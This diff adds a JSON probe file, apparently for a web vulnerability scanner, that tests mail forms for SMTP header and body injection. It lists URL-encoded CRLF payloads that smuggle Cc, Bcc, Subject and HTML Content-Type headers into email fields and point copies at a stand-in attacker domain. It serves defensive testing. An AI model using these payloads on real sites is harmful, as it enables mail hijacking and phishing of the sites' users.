@@ -1,0 +1,79 @@
+{
+  "category": "email_injection",
+  "contexts": {
+    "header_injection": {
+      "description": "SMTP header injection via CRLF in email fields -- inject CC/BCC/Subject headers to send email to attacker-controlled addresses",
+      "tech_match": ["PHP", "Python", "Ruby", "Node.js", "Java"],
+      "param_match": ["email", "to", "from", "subject", "cc", "bcc", "sender", "recipient", "mail", "contact", "message"],
+      "probes": [
+        {
+          "payload": "victim@example.com%0d%0aCc:swktest-{{marker}}@evil.example",
+          "description": "CRLF CC injection via URL-encoded CRLF -- inject Cc header to copy email to attacker address",
+          "matchers": [
+            {"type": "status", "status": [200, 302]},
+            {"type": "not_word", "words": ["invalid email", "invalid character", "bad address"]}
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        },
+        {
+          "payload": "victim@example.com%0aCc:swktest-{{marker}}@evil.example",
+          "description": "LF-only CC injection -- some mail libraries split on LF alone without requiring CR",
+          "matchers": [
+            {"type": "status", "status": [200, 302]},
+            {"type": "not_word", "words": ["invalid email", "invalid character"]}
+          ],
+          "severity": "high",
+          "confidence_boost": 45
+        },
+        {
+          "payload": "victim@example.com%0d%0aBcc:swktest-{{marker}}@evil.example",
+          "description": "CRLF BCC injection -- inject Bcc header for covert email copy to attacker",
+          "matchers": [
+            {"type": "status", "status": [200, 302]},
+            {"type": "not_word", "words": ["invalid email", "invalid character"]}
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        },
+        {
+          "payload": "victim@example.com%0d%0aSubject:swktest-{{marker}}",
+          "description": "CRLF Subject injection -- override email subject line proves SMTP header injection",
+          "matchers": [
+            {"type": "status", "status": [200, 302]},
+            {"type": "not_word", "words": ["invalid email", "invalid character"]}
+          ],
+          "severity": "medium",
+          "confidence_boost": 40
+        }
+      ]
+    },
+    "content_injection": {
+      "description": "Email body/content injection via CRLF -- manipulate email body content for phishing",
+      "tech_match": ["PHP", "Python", "Ruby", "Node.js"],
+      "param_match": ["email", "message", "body", "content", "text", "subject", "name"],
+      "probes": [
+        {
+          "payload": "victim@example.com%0d%0a%0d%0aswktest-body-inject-{{marker}}",
+          "description": "Double CRLF body injection -- inject content after headers into email body",
+          "matchers": [
+            {"type": "status", "status": [200, 302]},
+            {"type": "not_word", "words": ["invalid", "error", "rejected"]}
+          ],
+          "severity": "medium",
+          "confidence_boost": 35
+        },
+        {
+          "payload": "victim@example.com%0d%0aContent-Type: text/html%0d%0a%0d%0a<h1>swktest-{{marker}}</h1>",
+          "description": "Content-Type override to HTML -- inject HTML body into plaintext email for phishing",
+          "matchers": [
+            {"type": "status", "status": [200, 302]},
+            {"type": "not_word", "words": ["invalid", "rejected"]}
+          ],
+          "severity": "high",
+          "confidence_boost": 45
+        }
+      ]
+    }
+  }
+}
